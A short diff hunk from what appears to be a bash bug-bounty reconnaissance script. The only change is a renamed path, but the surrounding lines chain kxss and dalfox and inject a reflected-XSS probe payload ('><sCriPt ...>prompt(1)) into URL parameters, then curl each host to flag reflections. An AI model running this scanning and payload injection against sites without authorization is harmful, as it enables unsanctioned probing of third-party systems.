@@ -44,7 +44,7 @@ echo " "
 if [ -f ~/go/bin/kxss ]
 then
   echo "${magenta} [+] Running kxss ${reset}"
-cat $DOM/gf/xss.txt | kxss  | tee $DOM/vulnerabilities/xss_scan/kxss.txt
+cat $DOM/GF_Patterns/xss.txt | kxss  | tee $DOM/vulnerabilities/xss_scan/kxss.txt
 cat $DOM/vulnerabilities/xss_scan/kxss.txt | awk '{print $9}' | sed 's/=.*/=/' | tee $DOM/vulnerabilities/xss_scan/kxss1.txt
 cat $DOM/vulnerabilities/xss_scan/kxss1.txt | dalfox pipe | tee $DOM/vulnerabilities/xss_scan/dalfoxss.txt
 cat $DOM/gf/xss.txt | grep "=" | qsreplace "'><sCriPt class=khan>prompt(1)</script>" | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "'><sCriPt class=khan>prompt(1)" && echo "$host \033[0;31mVulnerable\n";done | tee $DOM/vulnerabilities/xss_scan/vulnxss.txt
